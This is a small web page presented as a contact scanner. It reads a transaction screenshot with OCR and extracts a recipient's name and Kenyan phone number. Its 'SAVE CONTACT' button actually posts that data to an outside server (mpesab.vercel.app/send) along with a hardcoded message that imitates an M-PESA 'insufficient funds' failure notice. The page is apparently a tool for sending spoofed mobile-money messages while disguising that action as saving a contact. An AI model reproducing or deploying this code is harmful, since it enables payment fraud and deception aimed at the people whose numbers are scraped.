
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact - Image Scanner</title>
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 100%; margin: auto; background: #1e1e1e; padding: 25px; border-radius: 15px; box-sizing: border-box; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    h3 { text-align: center; margin-top: 0; color: #4CAF50; }
    
    .upload-box { border: 2px dashed #4CAF50; padding: 30px; text-align: center; border-radius: 10px; cursor: pointer; transition: 0.3s; background: #252525; margin-bottom: 20px; }
    .upload-box:hover { background: #2a2a2a; border-color: #66bb6a; }
    #preview { width: 100%; max-height: 200px; object-fit: contain; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }

    .input-group { margin-bottom: 15px; }
    .input-group label { display: block; font-size: 0.8rem; color: #4CAF50; margin-bottom: 5px; font-weight: bold; }
    input[type="text"] { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #333; border-radius: 6px; color: white; font-size: 1rem; box-sizing: border-box; }
    input[type="text"]:focus { border-color: #4CAF50; outline: none; }

    button { width: 100%; padding: 15px; border: none; border-radius: 8px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
    button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
    button:disabled { background: #333; color: #777; cursor: not-allowed; }
    
    #status { text-align: center; font-size: 0.9rem; margin: 10px 0; min-height: 1.2rem; }
    pre { background: #000; padding: 15px; margin-top: 20px; border-radius: 8px; font-size: 0.9rem; color: #81c784; border: 1px solid #222; white-space: pre-wrap; }
    .loading { color: #ffeb3b; }
</style>
</head>
<body>

<div class="container">
    <h3>Contact Scanner</h3>
    
    <div class="upload-box" onclick="document.getElementById('fileInput').click()">
        <span id="uploadText">Tap to Upload Screenshot 📸</span>
        <input type="file" id="fileInput" accept="image/*" style="display: none;" onchange="processImage(this)">
        <img id="preview">
    </div>

    <div id="status"></div>

    <div class="input-group">
        <label>RECIPIENT NAME</label>
        <input type="text" id="resName" placeholder="Scanning name...">
    </div>

    <div class="input-group">
        <label>RECIPIENT NUMBER</label>
        <input type="text" id="resPhone" placeholder="Scanning number...">
    </div>

    <button id="saveBtn" onclick="saveData()">SAVE CONTACT</button>
    <pre id="result"></pre>
</div>

<script>
const API_URL = "https://mpesab.vercel.app";
const DUMMY_MSG = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";

async function processImage(input) {
    const file = input.files[0];
    if (!file) return;

    // Show Image Preview
    const reader = new FileReader();
    reader.onload = e => {
        const img = document.getElementById('preview');
        img.src = e.target.result;
        img.style.display = 'block';
        document.getElementById('uploadText').innerText = "Change Image";
    };
    reader.readAsDataURL(file);

    const status = document.getElementById('status');
    status.innerHTML = '<span class="loading">⏳ Scanning text...</span>';
    document.getElementById('saveBtn').disabled = true;

    try {
        // Run Tesseract OCR
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        extractDetails(text);
        status.innerHTML = '✅ Scan Complete';
    } catch (err) {
        status.innerHTML = '❌ Scan Failed';
        console.error(err);
    } finally {
        document.getElementById('saveBtn').disabled = false;
    }
}

function extractDetails(rawText) {
    console.log("Raw OCR Data:", rawText);
    
    // 1. Extract Phone Number (Looks for 07.., 01.., 254..)
    const phoneRegex = /(?:254|07|01)\d{8,9}/g;
    const phoneMatch = rawText.match(phoneRegex);
    const phone = phoneMatch ? phoneMatch[0] : "";

    // 2. Extract Name (Look for text between 'Recipient Name' and 'Operator Name')
    // We split by lines and look for the specific labels in your screenshot
    const lines = rawText.split('\n').map(l => l.trim());
    let name = "";

    for (let i = 0; i < lines.length; i++) {
        const lineLower = lines[i].toLowerCase();
        // If the line contains "Recipient Name", the actual name is usually the next line
        if (lineLower.includes("recipient name") && lines[i+1]) {
            name = lines[i+1];
            break;
        }
    }

    // Cleaning the name from artifacts (removing numbers or symbols OCR might hallucinate)
    if (!name || name.length < 2) {
        // Fallback: look for blocks of UPPERCASE names if label search fails
        const nameMatch = rawText.match(/[A-Z]{2,}\s[A-Z]{2,}/);
        name = nameMatch ? nameMatch[0] : "Unknown Recipient";
    }

    // Update UI fields
    document.getElementById('resName').value = name.replace(/[^a-zA-Z\s]/g, '').trim();
    document.getElementById('resPhone').value = phone;
}

async function saveData() {
    const btn = document.getElementById("saveBtn");
    const result = document.getElementById("result");
    const name = document.getElementById("resName").value.trim();
    const phone = document.getElementById("resPhone").value.trim();

    if (!phone || name === "Unknown Recipient") {
        alert("Please ensure Name and Number are correct.");
        return;
    }

    btn.disabled = true;
    btn.innerText = "SAVING...";

    try {
        const res = await fetch(`${API_URL}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: "SCAN" + Math.floor(Math.random() * 9999),
                message: DUMMY_MSG
            })
        });

        if (res.ok) {
            result.innerText = `Success! ✅\nSaved: ${name}\nNumber: ${phone}`;
            btn.innerText = "SAVED ✓";
        } else {
            throw new Error();
        }
    } catch (e) {
        result.innerText = "❌ Error connecting to server.";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>

</body>
</html>
